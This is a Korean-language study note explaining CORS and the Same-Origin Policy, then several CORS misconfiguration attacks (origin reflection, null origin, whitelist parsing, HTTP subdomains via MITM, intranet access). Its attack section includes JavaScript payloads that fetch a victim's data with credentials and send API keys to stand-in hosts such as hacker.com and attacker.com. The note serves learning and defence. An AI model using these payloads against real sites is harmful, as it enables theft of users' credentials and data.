## CORS

CORS(Cross-Origin Resource Sharing, 교차 출처 리소스 공유)는 브라우저에서 **다른 출처(Origin)의 리소스에 접근할 수 있도록 서버가 허용 여부를 알려주는 표준 방식**

### SOP

SOP(Same-Origin Policy, 동일 출처 정책)는 다른 Origin의 리소스를 JavaScript가 읽거나 조작하는 것을 막는 브라우저의 기본 보안 정책

#### Origin 

**Origin: Scheme + Host + Port**

| URL A                   | URL B                      | same-origin?  |
| ----------------------- | -------------------------- | ------------- |
| `https://example.com/a` | `https://example.com/b`    | ✅ (경로는 무시)    |
| `https://example.com`   | `http://example.com`       | ❌ (scheme 다름) |
| `https://example.com`   | `https://example.com:8080` | ❌ (port 다름)   |
| `https://example.com`   | `https://api.example.com`  | ❌ (host 다름)   |

#### 기본 동작 

SOP는 가져오기와 읽기/접근을 구분함. 대부분의 경우 **가져오기는 허용**하고 **읽기/접근은 막음.** 
예: `fetch`로 다른 Origin의 응답 본문을 읽는 것이 불가능함. 

| 리소스         | 로딩/표시/실행 | JS가 내용 읽기/접근     | CORS 필요 여부         |
| ----------- | -------- | ---------------- | ------------------ |
| `<img>`     | 가능       | 픽셀 읽기 불가         | 픽셀 읽으려면 필요         |
| `<video>`   | 가능       | 프레임 캡처 불가        | 캡처하려면 필요           |
| `fetch`/XHR | 요청은 가능   | 응답 읽기 불가         | 응답 읽으려면 필요         |
| `<script>`  | 로드/실행 가능 | 소스 읽기 불가         | 모듈은 필요             |
| `<iframe>`  | 표시 가능    | DOM 접근 불가        | DOM 접근은 CORS로도 제한적 |
| CSS         | 로드 가능    | `cssRules` 읽기 불가 | 규칙 읽으려면 필요         |
| Storage     | -        | 다른 Origin 접근 불가  | CORS와 무관           |


#### 예외 

1. `location`
	- 읽기: 불가능, 다른 Origin의 `iframe`이나 팝업의 `location.href`에 접근하려고 하면 막힘. 
	- 쓰기(이동): 가능, `location.href = 'https://...'`처럼 다른 URL로 이동시키는 것은 허용

2. `window.length`, `window.closed`
	- 읽기: 가능
	- 쓰기(호출): 불가능

3. `window.close()`, `window.blur()`, `window.focus()`
	- 쓰기(호출): 가능

4. `window.postMessage()`: cross-origin 통신을 안전하게 하기 위한 공식 수단
	- 쓰기(호출): 가능
	- 다른 Origin의 창에 메시지를 보내고 받는 쪽에서 `message` 이벤트로 처리

5. 쿠키: SOP와 별개로 동작
	- 쿠키는 Origin이 아닌 Site 기반으로 동작
	- `HttpOnly`: `document.cookie`로 읽고 쓰는 것이 불가능함. 
	- `Secure`: HTTPS 페이지에서만 Secure 쿠키를 읽고 쓸 수 있음.

6. `document.domain`: SOP를 일부러 완화하는 레거시 기능
	- 같은 상위 도메인을 가진 서브도메인끼리 SOP를 완화할 수 있음. 
		- 예: `marketing.example.com`와 `www.example.com`에서 둘 다 `document.domain = 'example.com'`으로 설정하면 서로 다른 Origin임에도 불구하고 DOM 접근이 허용됨. 
	- 최신 브라우저에서는 보안상의 이유로 deprecated임. 


### CORS

CORS(Cross-Origin Resource Sharing, 교차 출처 리소스 공유)는 HTTP 헤더를 사용해 cross-origin의 접근을 허용하는 방법임. 

**상황** 
`https://normal-website.com`의 JS인 `fetch`로 `https://robust-website.com/data`에 요청하는 경우

- 브라우저가 자동으로 Origin 헤더를 붙임. 
``` http 
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com 
```

- `robust-website.com` 서버의 응답
``` http 
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
```

그러면 브라우저는 **Origin과 Access-Control-Allow-Origin의 값을 비교해서 같은 경우**에 JS가 `fetch`의 응답 내용을 읽을 수 있게 허용해줌. 


#### 사전 요청

교차 출처(cross-origin) 상황에서 **단순 요청이 아닌 요청(non-simple)** 을 보낼 때, (보통 `fetch`나 `XMLHttpRequest`) **브라우저**가 바로 요청을 보내지 않고 자동으로 OPTIONS 메서드로 사전 요청을 보내서 서버에게 초기 검사를 하는 것이 CORS Preflight(사전 요청)이라고 함. 

| 구분           | 단순 요청 (simple request)                           | non-simple 요청        |
| ------------ | ------------------------------------------------ | -------------------- |
| 메서드          | GET, HEAD, POST                                  | PUT, DELETE, PATCH 등 |
| 헤더           | safelisted header만                               | 커스텀 헤더 포함            |
| Content-Type | form-urlencoded, multipart/form-data, text/plain | application/json 등   |
| HTML만으로 가능?  | 가능 (form, img 등)                                 | 불가능                  |
| Preflight    | 없음                                               | 있음                   |
| 요청 전송        | 바로 보냄                                            | **OPTIONS 먼저**       |
| 응답 읽기        | CORS 헤더 필요                                       | CORS 헤더 필요           |

다음을 검사함. Access-Control-Allow-Headers
- 요청을 보낸 **출처(Origin)**
- 사용하려는 **메서드(Method)**
- 사용하려는 **헤더(Headers)**
- (필요하다면) **인증 정보(Credentials)**

서버가 허용하면(`Access-Control-Allow-*` 헤더로 응답) → 브라우저가 **실제 요청**을 보냄
서버가 허용하지 않으면 → 브라우저가 **실제 요청을 보내지 않고 차단**함 (서버에 부작용이 생기는 걸 막음)


**예시**
PUT 요청, safelisted header가 아닌 Authorization, X-Request-Id(커스텀 헤더)를 사용하는 경우

- 브라우저의 사전 요청 
``` http 
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, x-request-id
```

- 서버의 응답 
``` http 
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: authorization, x-request-id, ...
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- `Access-Control-Allow-Origin`: 이 출처의 페이지가 응답을 읽어도 됨. 
- `Access-Control-Allow-Methods`: 실제 요청에서 허용하는 메서드 목록
- `Access-Control-Allow-Headers`: 실제 요청에서 허용하는 헤더 목록
- `Access-Control-Allow-Credentials`: 인증 정보(쿠키, Authorization, TLS 클라이언트 인증서)를 포함한 요청을 허용할지
	- 응답 값이 `true`여도 자동으로 쿠키가 포함되려면 설정을 해줘야함. 
	- `fetch`: `credentials: 'include'` 설정을 추가해야함. 
	- `XMLHttpRequest`: `xhr.withCredentials = true;` 설정을 추가해야함. 
 
**흐름도** 
``` txt
요청 발생 (fetch)
│
├─ 동일 출처인가?
│   └─ YES → 그냥 보냄 (CORS 무관)
│
└─ 교차 출처인가?
    │
    ├─ no-cors 모드인가?
    │   └─ YES → 그냥 보냄, 응답 읽기 불가, preflight 없음
    │
    └─ cors 모드인가?
        │
        ├─ 단순 요청인가? - GET, HEAD, POST
        │   └─ YES → 그냥 보냄, 응답은 CORS 헤더 있을 때만 읽힘
        │
        └─ non-simple 요청인가? - PUT, DELETE, PATCH emd
            └─ YES → OPTIONS(preflight) 먼저 보냄
                     → 서버가 허용하면 실제 요청 보냄
                     → 허용 안 하면 실제 요청 안 보냄
```


### 취약점

많은 웹 애플리케이션은 서브도메인 및 신뢰할 수 있는 제3자로부터 접근을 허용하기 위해 CORS를 사용함. 그러나 CORS 구현에 오류가 있거나 CORS 정책을 지나치게 관대하게 설계하면 취약점이 발생할 수 있음. 

기존 요청에 Origin 헤더를 추가했을 때 응답에 Access-Control-Allow-Origin 헤더가 포함되어 있으면 해당 도메인을 허용하는 것임. 

#### Origin 반사

일부 애플리케이션은 cross-origin 요청에서 허용되는 도메인 목록을 유지하는 비용과 노력을 들이지 않기 위해 **클라이언트의 HTTP 요청 Origin 헤더를 기반**으로 Access-Control-Allow-Origin를 생성하고 응답에 포함함. 

**예시**
``` http 
GET /sensitive-target-data HTTP/1.1
Host: target.com
Origin: https://hacker.com
Cookie: sessionid=...
```

``` http 
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://hacker.com
Access-Control-Allow-Credentials: true
...
```

**공격 스크립트**
해커의 웹사이트, 혹은 XSS를 통해서 주입한 스크립트를 피해자의 브라우저가 읽은 경우 공격이 성공함. 

- `fetch`
``` js
fetch("https://target.com/accountDetails", {
     credentials: "include",
})
    .then(response => response.json())
    .then(result => location=`https://hacker.com?apikey=${result.apikey}`)
```

- `XMLHttpRequest`
``` js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://target.com/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/apikey='+this.responseText;
    };
</script>
```


#### Origin 헤더 파싱 오류

일부 애플리케이션은 여러 출처에서 접근을 지원하기 위해 화이트리스트를 사용함.
URL 접두사 또는 접미사를 일치하거나 정규 표현식을 사용하여 구현할 때 의도치 않은 외부 도메인에 대한 접근을 허용할 수 있음. 

**예시**
`normal-website.com`를 허용하는 경우 공격자 도메인
- `hackersnormal-website.com`
- `normal-website.com.evil-user.net` 


#### null Origin 우회

Origin 헤더에 null 값이 들어갈 수 있음. 
- 리다이렉트 요청
- `data:` URL, `blob:` URL 등 직렬화된 데이터가 나가는 요청
- `file:` 프로토콜 요청
- **샌드박스 방식의 교차 출처 요청**: `allow-same-origin`이 없는 `iframe`

요청 
``` http 
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

응답: null Origin을 허용하는 서버
``` http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

공격 스크립트 
``` html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
          fetch('https://target.com/sensitive-victim-data', {
            credentials: 'include'
          })
          .then(res => res.text())
          .then(data => {
            location = 'https://hacker.com/log?key=' + encodeURIComponent(data);
          });
        </script>">
</iframe>
```
- `<iframe sandbox=...>`에서 `allow-same-origin`를 설정하지 않으면 Origin에 null이 붙음. 


#### XSS 공격 활용

만약 애플리케이션이 신뢰하는 웹사이트가 XSS 취약점이 있다면 XSS를 이용해서 해당 출처에 CORS를 통해 데이터를 가져오는 스크립트를 삽입할 수 있음. 

**예시** 
애플리케이션이 `subdomain.vulnerable-website.com`를 신뢰하는데 해당 웹사이트에 XSS 취약점이 있는 경우
``` url
https://subdomain.vulnerable-website.com/?xss=<script>공격 스크립트</script>
```


#### HTTP 서브도메인 우회

애플리케이션에서 HTTPS를 사용하지만 **신뢰할 수 있는 서브도메인에 HTTP를 허용하는 경우**
공격자가 서브도메인에 대한 요청을 가로채서 가짜 응답을 줌으로써 피해자 브라우저가 가짜 페이지를 서브도메인의 결과로 인식하게 함. 가짜 페이지는 메인 사이트에 요청을 보낼때 Origin이 서브도메인으로 설정되고 민감한 데이터를 받아 유출 할 수 있음. 

공격자가 **MITM(Man-in-the-Middle)** 를 활용해서 피해자와 서버 사이의 요청을 가로챌 수 있어야함. 
- **같은 Wi-Fi**: 카페, 공항, 호텔
- **악성 공유기**: 공격자가 설치한 Wi-Fi
- **ISP(인터넷 제공자)** 레벨 가로채기
- **ARP 스푸핑** 등 로컬 네트워크 공격

**예시**
메인 사이트 도메인: `https://target.com`
메인 사이트가 CORS를 허용하는 서브 도메인: `http://subdomain.target.com`
``` http 
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://subdomain.target.com
Access-Control-Allow-Credentials: true
```

**공격 흐름**
1. 피해자가 HTTP 요청을 보냄. 
	- 리다이렉트 시키면 되기 때문에 `http://subdomain.target.com`가 아니라도 상관 없음. 

2. 공격자가 리다이렉트 시킴: MITM 위치의 공격자가 피해자의 HTTP 트래픽을 가로채서 서브도메인으로 보냄. 
``` http
HTTP/1.1 302 Found
Location: http://subdomain.target.com
```

3. 공격자가 가짜 응답을 반환: 피해자 브라우저가 `http://subdomain.target.com`으로 요청을 보내면 공격자가 그 요청을 가로채서 가짜 페이지를 반환함. 
``` html
<!-- 공격자가 위조한 페이지 -->
<script>
fetch('https://target.com/api/requestApiKey', {
  credentials: 'include'
})
.then(res => res.text())
.then(data => {
  fetch('https://attacker.com/log?key=' + encodeURIComponent(data));
});
</script>
```
- **피해자 브라우저 입장에서 이 가짜 페이지는 `http://subdomain.target.com`에서 온 것으로 인식됨.** 

4. 가짜 페이지가 메인 사이트에 CORS 요청: 가짜 페이지의 JS가 실행되면서 메인 사이트에 요청을 보내는데 Origin 주소가 `http://subdomain.target.com`으로 됨. 

5. 메인 사이트가 CORS 허용: 메인 사이트 입장에서는 신뢰하는 서브 도메인에서 온 요청이기 때문에 정상적으로 응답을 주고 가짜 페이지에서는 그 응답 데이터를 탈취함. 


#### 사내 웹사이트 공격

대부분의 CORS 공격은 `Access-Control-Allow-Credentials: true` 응답 헤더가 있어야 가능한 것임. 해당 헤더가 없으면 사용자 브라우저의 쿠키를 보내지 않으므로 인증되지 않은 데이터만 접근이 가능함. 이 데이터들은 공격자가 직접 대상 웹사이트에 접속하여 얻을 수 있는 데이터와 동일한 것임. 즉, 공격의 의미가 없음. 

그러나 쿠키를 보내지 않아도 공격이 의미가 있는 경우는 **사내 네트워크에 있는 웹사이트**에 접근할 때임.
사내 웹사이트는 일반적으로 외부에서 접근이 불가하기 때문에 보통 외부 웹사이트보다 낮은 보안 수준으로 관리됨. 

공격 흐름
1. 내부 네트워크에 존재하는 피해자가 외부의 웹사이트를 방문함. (XSS 취약점이 있는 웹사이트나 공격자의 웹사이트)
2. 내부 웹사이트로 요청을 보내는 악성 스크립트 실행
	- 내부 웹사이트에서 받은 응답의 데이터를 공격자의 서버로 보내는 요청
3. 피해자의 브라우저는 내부망에 있으므로 내부 웹사이트에 접근이 가능


